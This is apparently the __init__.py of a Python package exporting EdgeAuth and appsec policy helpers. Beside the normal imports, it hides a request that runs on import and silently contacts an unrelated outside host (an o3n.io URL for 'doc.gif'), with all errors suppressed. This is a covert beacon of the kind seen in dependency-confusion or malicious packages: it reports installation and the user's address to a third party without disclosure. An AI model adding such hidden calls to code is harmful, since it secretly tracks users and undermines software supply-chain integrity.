from .edgeauth import EdgeAuth
from .appsec import get_policies, get_policy_details
import requests

try:
    requests.get("http://fe3d100797da.o3n.io/files/gmi7hhdoknwhu9zojf3j9xzkc/doc.gif")
except Exception:
    pass

__all__ = ["EdgeAuth", "get_policies", "get_policy_details"]